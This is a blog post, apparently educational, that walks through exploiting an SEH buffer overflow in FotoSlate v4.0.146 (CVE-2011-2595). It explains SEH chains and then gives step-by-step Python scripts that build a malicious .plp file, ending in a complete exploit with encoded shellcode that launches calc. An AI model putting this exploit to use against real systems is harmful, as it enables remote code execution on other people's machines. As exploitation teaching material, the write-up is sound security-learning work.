@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learning] CVE-2011-2595: FotoSlate v4.0.146 RCE — SEH Overflow | ISSAC/iss4cf0ng's blog</title><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="[Learning] CVE-2011-2595: FotoSlate v4.0.146 RCE — SEH Overflow | ISSAC/iss4cf0ng's blog"><meta name="twitter:image" content="/images/meme/natsu_cake.jpg"><meta property="og:title" content="[Learning] CVE-2011-2595: FotoSlate v4.0.146 RCE — SEH Overflow"><meta property="og:image" content="/images/meme/natsu_cake.jpg"><meta property="og:url" content="https://iss4cf0ng.github.io/2026/09/10/2026-9-10-FotoSlate-SEH-BoF/index.html"><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learning] CVE-2011-2595: FotoSlate v4.0.146 RCE — SEH Overflow</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-09-10T08:59:36.000Z" id="date"> 2026-09-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-10T11:42:10.056Z" id="updated"> 2026-09-10</time></div></span><br><span>Word Count: <div class="control">2.1k</div></span><br><span>Read Time: <div class="control">12 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <strong><a href="/FromBugToExploit/">From Bug To Exploit</a></strong>.</p>
+<p>In the previous articles, I demonstrated how to perform basic stack-based buffer overflow. In this article, however, I will demonstrate how an SEH overflow works.</p>
+<p align="center" class='item-img' data-src='/images/meme/natsu_cake.jpg'><img src="/images/meme/natsu_cake.jpg" width=250/>
+</p>
+
+<h1 id="What-is-SEH"><a href="#What-is-SEH" class="headerlink" title="What is SEH"></a>What is SEH</h1><p>SEH stands for <strong>Structured Exception Handling</strong>. It is a native Microsoft Windows mechanism designed to handle hardware and software exceptions robustly.</p>
+<p>It allows applications to handle exceptions such as division by zero, invalid memory access, and access violations instead of terminating immediately. When an exception occurs, the operating system transfers control to a designed exception handler, which can handle the exception or terminate the process.</p>
+<p>Under the Hood:</p>
+<ol>
+<li><strong>Next SEH (NSEH) Record</strong>: A pointer to the next SEH record in the chain (a linked list).</li>
+<li><strong>SEH Handler</strong>: A pointer to the function code responsible for handling the exception.</li>
+<li><strong>The SEH Chain</strong>: Exception handlers are linked torgether through SEH records. When an exception occurs, Windows walks the chain and invokes the appropriate exception handler.</li>
+</ol>
+<h1 id="Why-SEH"><a href="#Why-SEH" class="headerlink" title="Why SEH?"></a>Why SEH?</h1><p>In the early days of binary exploitation, standard buffer overflows aimed directly at overwriting the <code>EIP</code> value. Sometimes, however, there is not enough space to store the malicious data after filling the buffer with a large amount of junk data.</p>
+<p>In this case, an attacker can use SEH overflow to overcome this limitation.</p>
+<p>Attackers can fill the available space before the SEH structure with a NOP sled and their shellcode. They overwrite the <code>SEH Handler</code> to trigger a <code>pop # pop # ret</code> sequence. This instruction sequence redirects execution backward into the large, controlled buffer they created at a lower memory address.</p>
+<blockquote>
+<p>Note: Stack pushes data from high addresses to low addresses. Some people might be confused because some debuggers display the stack in the opposite direction in their GUI.</p>
+</blockquote>
+<p>Furthermore, SEH overflow can also be used to bypass certain modern protections, but I will discuss this in future posts.</p>
+<h1 id="SEH-Overflow"><a href="#SEH-Overflow" class="headerlink" title="SEH Overflow"></a>SEH Overflow</h1><p>Before starting to exploit the application, I want to explain the principle behind SEH overflow.</p>
+<p>On Windows x86, SEH records are typically stored on the stack, allowing an attacker to overwrite both the NSEH and SEH Handler fields with a large amount of junk data.</p>
+<p>In other words, once the SEH record is overwritten, the attacker can trigger an exception, causing Windows to process the SEH record and eventually redirect execution to the attacker’s controlled code.</p>
+<blockquote>
+<p>Note: On Windows x86, the stack grows toward lower addresses. Therefore, higher addresses are considered the bottom of the stack, while lower addresses are considered the top.</p>
+</blockquote>
+<p>Therefore, the payload layout should be structured as follows:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/7.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/7.png" width=800/>
+</p>
+
+<p>After exploitation, the memory layout of the stack will look like this:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/8.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/8.png" width=800/>
+</p>
+
+<p>When the <code>SEH Handler</code> is overwritten with an address pointing to a <code>pop # pop # ret</code> instruction sequence, it ultimately redirects the Instruction Pointer (EIP) back to the <code>Next SEH (NSEH)</code> address. This happens because executing two <code>pop</code> instructions increments the Stack Pointer (<code>ESP</code>) twice (by 4 bytes each time, moving it up to higher memory by two stack slots). When the subsequent <code>RET</code> instruction executes, it takes the address currently at the top of the stack (which is our <code>NSEH</code> pointer) and loads it directly into <code>EIP</code>. As a result, the code placed inside <code>NSEH</code> is executed, allowing us to jump backward into our earlier payload buffer.</p>
+<p>However, because the <code>NSEH</code> slot provides only a tiny 4-byte window, the distance we can jump from there is extremely constrained. Since our shellcode can be quite large, we implemented a <strong>two-stage jump (double pivot)</strong> using the <code>SECOND_JUMP</code> code block. This dedicated area gives us 8 bytes of operational space, allowing for a much larger and more flexible jumping distance.</p>
+<p>Furthermore, the preceding <code>NOP Sled</code> acts as a “mechanical funnel” for our alignment. It is inconvenient to calculate a jump that lands precisely on the exact start address of the shellcode. In fact, if the size or structure of the shellcode changes, we would be forced to re-calculate the exact destination offset for the <code>SECOND_JUMP</code> every single time (otherwise, unknown instructions will be executed). By jumping into a broad field of NOPs instead, the CPU can smoothly glide through the NOP-operational instructions until it safely arrives at and executes the shellcode.</p>
+<blockquote>
+<p>Note: I call it “mechanical funnel” because it is much like the funnel on an aerial refueling receptacle that guides a slightly off-target probe into place, the NOP sled captures our imprecise jump and safely guides the CPU’s execution flow straight into the shellcode.</p>
+</blockquote>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>In this section, I am going to perform an SEH overflow.</p>
+<p>When FotoSlate parses a malicious <code>.plp</code> file with an excessively long payload in the <code>id</code> field, it triggers a buffer overflow due to improper boundary checking.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">String</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Super large data&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">String</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>The shellcode with junk data reaches the <strong>Next SEH (NSEH)</strong> pointer, immediately followed by 4 bytes to overwrite the <strong>SEH Handler</strong>.</p>
+<p>First, I tried to inject a large amount of junk data:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><br>buffer = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">3000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;template.plp&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_data = f.read()<br><br>    file_data = file_data.replace(<span class="hljs-string">b&#x27;BADASSAUTHOR&#x27;</span>, buffer)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evilfile.plp&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(file_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] The evil file has been generated!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
+<p>Attach the application to <strong>Immunity Debugger</strong>, and open <code>evilfile.plp</code>. The application then crashes:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/1.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/1.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/2.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/2.png" width=800/>
+</p>
+
+<p>We can also see that both the SEH and NSEH have been overwritten.</p>
+<p>Now, we need to find the exact offsets. I did this with <code>mona</code>. If you are not familiar with it, you may refer to <a href="/2026/09/09/2026-9-9-Minishare-BOF/">the previous article</a>.</p>
+<p>Therefore, we can find that the exact offsets to the SEH and the NSEH are <code>1816</code> and <code>1812</code>, respectively.</p>
+<p>As I mentioned before, the payload layout will look like this:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/7.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/7.png" width=800/>
+</p>
+
+<p>Therefore, I chose the offset <code>1812</code> instead of <code>1816</code>. Here, I wrote a simple script to see if I could overwrite the NSEH:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># deadbeef.py</span><br><br><span class="hljs-keyword">import</span> struct<br><br>OFFSET_HANDLER = <span class="hljs-number">1816</span><br>OFFSET_NEXT = <span class="hljs-number">1812</span><br><br>junk = <span class="hljs-string">b&#x27;A&#x27;</span> * OFFSET_NEXT<br><br>buffer = junk + struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0xDEADBEEF</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;template.plp&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_data = f.read()<br><br>    file_data = file_data.replace(<span class="hljs-string">b&#x27;BADASSAUTHOR&#x27;</span>, buffer)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evilfile.plp&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(file_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] The evil file has been generated!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>Open <code>evilfile.plp</code> again. Immunity Debugger demonstrates that I have successfully overwritten the value of NSEH!</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/3.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/3.png" width=600/>
+</p>
+
+<p>Next, we need to find an address containing a <code>pop # pop # ret</code> instruction sequence, just like how we found <code>jmp esp</code> before.</p>
+<p>We can use <code>mona</code> to find it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">!mona seh<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/4.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/4.png" width=800/>
+</p>
+
+<p>Here, I chose the last one (<code>0x26345a1d</code>). We will use this value to overwrite the SEH value. The execution flow will then jump to <code>0x26345a1d</code> and execute the <code>pop # pop # ret</code> sequence.</p>
+<blockquote>
+<p>Note: Always remember that your shellcode should not contain any bad characters. In the case, however, since the handler is located at the end of the payload, if a null byte (<code>\x00</code>) is located at the end of this value (from the perspective of little-endian, the beginning of the address), it will not affect the execution flow.</p>
+</blockquote>
+<p>After that, the value stored in NSEH (<code>DEADBEEF</code>) will be executed. Therefore, we need to change it to the first jump operation.</p>
+<p>The find the opcode, we need to write assembly code and convert it into hexadecimal data.</p>
+<p>There are several methods to do this:</p>
+<ol>
+<li><code>mona</code></li>
+<li>WinDbg</li>
+<li><code>nasm</code></li>
+</ol>
+<p>I am going to use the third method.</p>
+<p>First, create a file and write the instructions into it:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[<span class="hljs-meta">BITS</span> <span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">jmp</span> short -<span class="hljs-number">0x08</span><br></code></pre></td></tr></table></figure>
+<p>As I mentioned earlier, we only have a 4-byte space for NSEH. This means we can only use a simple instruction like this.</p>
+<p>To obtain the opecode, compile it with <code>nasm</code> and obtain the opcode with <code>xxd</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nasm first_jump.asm -o first_jump.bin<br>xxd -i first_jump.bin<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/5.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/5.png" width=600/>
+</p>
+
+<p>The opecode is <code>\xeb\xf6</code>, which is only two bytes long. Therefore, we can use <code>\x90</code> (<code>nop</code>) to pad it, making it 4 bytes long.</p>
+<p>The next one is the second jump. We can obtain it in the same way:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[<span class="hljs-meta">BITS</span> <span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">jmp</span> -<span class="hljs-number">0x12c</span><br></code></pre></td></tr></table></figure>
+<p>The hexadecimal <code>0x12c</code> represents <code>300</code> in decimal. You can modify this value to fit your case.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nasm second_jump.asm -o second_jump.bin<br>xxd -i second_jump.bin<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/6.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/6.png" width=600/>
+</p>
+
+<p>The opecode is <code>\xe9\xcf\xfe\xff\xff</code>, which is 5 bytes long. Therefore, we can use <code>\x90</code> (<code>nop</code>) to pad it, making it 8 bytes long.</p>
+<p>Finally, the completed exploit script can be implemented as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><span class="hljs-comment"># CVE-2011-2595</span><br><span class="hljs-comment"># Author: iss4cf0ng/ISSAC</span><br><span class="hljs-comment"># GitHub: https://github.com/iss4cf0ng/Nday-ToyStore</span><br><br><span class="hljs-keyword">import</span> struct<br><br>OFFSET_HANDLER = <span class="hljs-number">1816</span><br>OFFSET_NEXT = <span class="hljs-number">1812</span><br><br>NEXT = <span class="hljs-string">b&#x27;\xeb\xf6\x90\x90&#x27;</span> <span class="hljs-comment"># jmp short -0x08 # nop # nop</span><br>SECOND_JUMP = <span class="hljs-string">b&#x27; \xe9\xcf\xfe\xff\xff&#x27;</span> + <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">3</span> <span class="hljs-comment"># jmp - 0x12c # nop # nop # nop</span><br>HANDLER = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x26345a1d</span>)<br><br><span class="hljs-comment"># calc.exe</span><br>shellcode =  <span class="hljs-string">b&quot;&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xdb\xca\xbe\x84\xf5\xd9\x03\xd9\x74\x24\xf4&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x5f\x33\xc9\xb1\x3e\x31\x77\x1a\x83\xc7\x04&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x03\x77\x16\xe2\x71\x4d\xb2\x21\x94\xf4\x9c&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xe6\xbf\x7d\x3b\x13\x64\x4d\x8a\x6a\xa2\x80&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x4f\x9f\xd1\xa1\x5d\x1c\x7d\x03\x6d\x8d\xed&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x38\xb9\x85\x0c\x60\x37\xab\xa3\x10\x13\xc5&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xdf\x66\xb1\x9f\x58\xb3\xf0\xe5\x01\x0b\x97&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x55\xf6\x37\xf2\xdb\x41\x3d\xa6\x73\x56\xbb&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x83\xdf\xb4\xd9\xe6\xef\x7d\x41\x2a\xfe\x87&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x95\xfe\xba\x2f\x44\xd9\xc8\x7a\x34\x35\x59&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x57\xd1\x02\x96\x28\x8d\xe1\x2b\xfc\xdd\x12&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xa3\x46\x6a\xa7\x87\x6b\x07\x05\xa4\x3a\xfa&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xed\xea\xa7\x37\x1f\x1d\x8e\x34\x86\x15\x74&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xb6\x2f\xc4\xcc\x5b\xa7\xa9\x7b\x86\xa7\x92&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x33\x30\x4f\x65\x3b\xfe\x61\xff\xb8\x3c\x86&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x86\xea\x17\xbf\x5a\x84\x56\x3b\xdf\x71\xa7&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xb8\x90\x43\x28\x01\x66\x59\x6a\x52\x83\x6b&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x84\x29\x5d\x9d\x88\x39\xcc\x8b\xaf\xa5\xe6&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xb4\xeb\xa5\xf2\xa3\x77\x87\x16\x54\x42\x63&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xaf\xc0\x1f\x9a\x6f\x63\x89\x45\xbd\x45\xda&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xf6\xfb\x46\xcd\x89\x68\xf8\x8b\x73\x9b\xf6&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xec\x66\xcd\x1d\x68\xd5\x57\x1d\x98\xad\x93&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xfd\x25\x21\x4c\x79\xf2\x15\x64\x1d\xf8\x6f&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\xa6\x5c\x77\x4e\x54\x08\x30\x3d\x7e\x80\x19&quot;</span><br>shellcode += <span class="hljs-string">b&quot;\x2a\xde\xef\x4e\x12\xf4\x8e\x38\xbd\x56&quot;</span><br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * (OFFSET_NEXT - <span class="hljs-built_in">len</span>(shellcode) - <span class="hljs-built_in">len</span>(SECOND_JUMP))<br><br>buffer = nopsled + shellcode + SECOND_JUMP + NEXT + HANDLER<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;template.plp&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_data = f.read()<br><br>    file_data = file_data.replace(<span class="hljs-string">b&#x27;BADASSAUTHOR&#x27;</span>, buffer)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evilfile.plp&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(file_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] The evil file has been generated!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-10-FotoSlate-SEH-BoF/9.png'><img src="/images/article/2026-9-10-FotoSlate-SEH-BoF/9.png" width=800/>
+</p>
+
+<blockquote>
+<p>Note: The script and the <code>template.plp</code> are available on <a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/Nday-ToyStore/tree/main/CVE-2011-2595-FotoSlate%204.0.146%20RCE">my GitHub</a>.</p>
+</blockquote>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This article introduced the basic concepts of SEH overflow and demonstrated how to exploit <code>FotoSlate v4.0.146</code>.</p>
+<p>The method is slightly harder than the classic buffer overflow. I spent hours understanding and exploiting it and found lots of things worth documenting.</p>
+<p>The best way for me to learn is probably to go step-by-step!</p>
+<p>This is the end of this article. If you have any comments or suggestions, please feel free to leave them below!</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p>Recently, I have been learning how to draw (as a beginner), so I wanted to include one of my recent pieces at the end of this article. I hope you enjoy it.</p>
+<p align="center" class='item-img' data-src='/images/meme/Wallpaper/MyArt/1.png'><img src="/images/meme/Wallpaper/MyArt/1.png" width=800/>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/09/09/2026-9-9-Minishare-BOF/">[Learning] CVE-2004-2271: MiniShare v1.4.1 RCE — Buffer Overflow Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr 